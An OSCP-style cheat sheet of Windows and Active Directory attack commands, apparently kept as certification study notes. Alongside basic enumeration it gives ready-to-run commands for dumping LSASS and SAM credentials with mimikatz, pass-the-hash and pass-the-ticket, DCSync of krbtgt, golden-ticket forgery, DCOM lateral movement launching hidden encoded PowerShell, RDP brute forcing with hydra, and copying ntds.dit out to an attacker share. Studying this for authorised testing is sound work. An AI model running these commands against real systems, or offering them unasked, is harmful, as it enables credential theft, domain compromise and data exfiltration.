Port scan for Win:

```bash
nmap -sC -sV -A -Pn -p 53,88,135,139,445 $TARGET_IP -vv
```
OSCP guidance for enumeration:
---
#oscp #windows-enum #pen-200
```powershell
whoami /groups
(Get-PSReadlineOption).HistorySavePath
type (Get-PSReadlineOption).HistorySavePath
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember "$GROUP"
Get-ChildItem -Recurse
systeminfo
ipconfig /all
route print
netstat -ano
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process # or tasklist /SVC
Get-Process | findstr /V /R "svchost winlogon vm3dservice RuntimeBroker vmtoolsd SearchHost lsass"
```

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
net user $USER
runas /user:$USER cmd
.\PsLoggedon.exe \\$OTHER_MACHINE # get users logged into $OTHER_MACHINE
```

Start new powershell with administrator privs:

```powershell
Start-Process PowerShell -verb runas
```

Reboot Windows:

```powershell
shutdown /r /t 0
```

Type powershell history:
```powershell
type $((Get-PSReadlineOption).HistorySavePath)
```

Find which DotNet version is installed:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version
```

use winpeas.exe, search for DPAPI: `_Checking for DPAPI Credential Files`_

```powershell
.\Seatbelt.exe -group=all
```

```powershell
$password = ConvertTo-SecureString $PASS -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($USER, $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

Run as administrator:
```powershell
Start-Process PowerShell -Verb RunAs
```

Check OS architecture / version:
```powershell
ver
wmic os get osarchitecture
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Get OS patches:
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Get OS drives:
```powershell
wmic logicaldisk get caption,description,providername
```
Get network adapters and open ports:
```powershell
ipconfig /all
netstat -ano
```

Get routes:
```powershell
route PRINT
```

Get running processes:

```powershell
tasklist /SVC
```

# Get installed patches:

```powershell
wmic qfe
```

# Search for cleartext passwords:
```powershell
findstr /si password *.txt
findstr /spin "password" *.*
```

# Dump LSASS:
check for #SeDebugPrivilege

```powershell
whoami /priv
#run mimikatz
```

```bash
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M minidump
pypykatz lsa minidump lsass.DMP
```
or using netexec (faster, more modern)
```bash
nxc smb $TARGET_IP -u $USER -p $PASSWORD -M nanodump
```

run in a non-interactive shell
```powershell
$results = .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
echo $results
```

Add domain NB name to /etc/hosts

```bash
crackmapexec smb $TARGET_IP -u '' -p ''
```

check for open shares

```bash
crackmapexec smb $TARGET_IP -u '' -p '' --shares
```

Enumerate users by brute forcing RID
#rid #bruteforce-rid

```shell
crackmapexec smb $AD_DOMAIN -u $USER -p '' --rid-brute 10000
#extract usernames
crackmapexec smb $AD_DOMAIN -u $USER -p '' --rid-brute 10000 | grep -o '\\[^ ]*' | awk -F'\\' '{print $2}' | uniq
```

Show all files and DIRs for guest:

```shell
crackmapexec smb $TARGET_IP -u 'guest' -p '' -M spider_plus
```

```shell
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M spider_plus --spider users
```

Parse the JSON from the previous cmd into readable form:

```shell
cat $TARGET_IP.json | jq '. |map_values(keys)'
```

Mount windows share:
```bash
sudo mount -o username=$USER,password=$PASSWORD -t cifs \\\\$TARGET_IP\$SHARE /mnt
```

wmiexec (on port 445) with hash (administrator account only):
#pass-the-hash #pth #wmiexec
```bash
crackmapexec smb -u administrator -H $HASH -X "powershell -e ..."
impacket-wmiexec -hashes :$HASH Administrator@$TARGET_IP
```
smbclient:
#pass-the-hash 
```bash
smbclient \\\\$TARGET_IP\\$SHARE -U Administrator --pw-nt-hash $HASH
```

Try to connect to console:

```shell
impacket-psexec $USER:$PASSWORD@$TARGET_IP
```

```bash
impacket-wmiexec -hashes :$NTLM Administrator@$TARGET_IP
```

```shell
evil-winrm -i $TARGET_IP -u administrator -p $PASSWORD
```

```shell
evil-winrm -i $TARGET_IP -u administrator -H $HASH
```

```sh
crackmapexec winrm $TARGET_IP -u $USER -p $PASSWORD
```


Port 3389 RDP with clipboard enabled:

```bash
xfreerdp +clipboard /v:$TARGET_IP /u:$USER /cert:ignore
```

Connect with shared folder, and NLA :
```bash
xfreerdp +clipboard /v:$TARGET_IP /sec:nla /u:$USER /p:$PASSWORD /cert:ignore /drive:shared,/home/kali/shared
xfreerdp +clipboard /v:$TARGET_IP /sec:nla /u:$USER /p:$PASSWORD /cert:ignore /drive:shared,/home/kali/shared /d:$AD_DOMAIN
```

Brute force RDP:

```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p $PASSWORD rdp://$TARGET_IP -I
```

Elevate powershell to administrator:
#elevate-powershell #powershell-admin

```powershell
Start-Process powershell -Verb runas -ArgumentList "-NoExit -c cd '$pwd'"
```

mimikatz dump as local admin:
#dump #mimikatz
```powershell
.\mimikatz
privilege::debug
token::elevate
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
```

```powershell
$results = .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
echo $results
```

```powershell
$results = .\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
echo $results
```

```powershell
$results = .\mimikatz.exe privilege::debug token::elevate lsadump::secrets exit
echo $results
```
or all in one go:
```powershell
$results = .\mimikatz.exe privilege::debug token::elevate sekurlsa::logonpasswords lsadump::sam lsadump::secrets exit
echo $results
```

#pth #overpass-the-hash 

```powershell
sekurlsa::pth /user:$USER /domain:$TARGET_DOMAIN /ntlm:$HASH /run:powershell
#on the new powershell
net use \\$TARGET_IP
.\PsExec.exe \\$TARGET_IP cmd
```
#pass-the-ticket

```poweshell
privilege::debug
sekurlsa::tickets /export
#ls *.kirbi
#select ticket matching target host
kerberos::ptt $TICKET
.\PsExec.exe \\$TARGET_IP cmd
```
mimikatz as domain admin:
#mimikatz #dcsync #dc-sync #krbtgt
```powershell
privilege::debug
lsadump::dcsync /user:$AD_DOMAIN\krbtgt
```

DCOM:
#dcom #lateral-ad-movement 
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$TARGET_IP"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JAB....","7")
```

Golden ticket:
#priv-esc-ad #golden-ticket #krbtgt #kerberos 
```powershell
#start mimikatz
privilege::debug
kerberos::purge
lsadump::lsa /patch
kerberos::golden /user:$USER /domain:$TARGET_AD /sid:$TARGET_SID /krbtgt:$HASH /ptt
misc::cmd
PsExec.exe \\$DOMAIN_CONTROLLER cmd.exe
```

Volume Shadow Copy:
#vshadow #ntds #system-bak
```powershell
reg.exe save hklm\system c:\system.bak
vshadow.exe -p -nw C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit.bak
cp .\ntds.dit.bak \\tsclient\shared
```